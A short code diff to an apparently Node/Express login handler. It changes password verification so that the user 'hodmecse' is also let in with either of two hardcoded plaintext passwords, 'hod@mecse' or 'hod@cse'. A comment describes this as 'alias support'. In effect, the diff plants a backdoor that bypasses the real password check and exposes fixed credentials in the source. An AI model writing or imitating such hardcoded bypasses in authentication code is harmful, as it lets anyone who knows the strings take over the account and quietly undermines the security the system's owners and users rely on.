@@ -128,8 +128,13 @@ router.post('/login', async (req, res) => {
             return res.status(401).json({ error: 'Invalid username or password' });
         }
 
-        // Verify password
-        if (!verifyPassword(password, user.password)) {
+        // Verify password (with alias support for hodmecse accepting hod@mecse or hod@cse)
+        let isValidPass = verifyPassword(password, user.password);
+        if (!isValidPass && user.username === 'hodmecse' && (password === 'hod@mecse' || password === 'hod@cse')) {
+            isValidPass = true;
+        }
+
+        if (!isValidPass) {
             return res.status(401).json({ error: 'Invalid username or password' });
         }
 
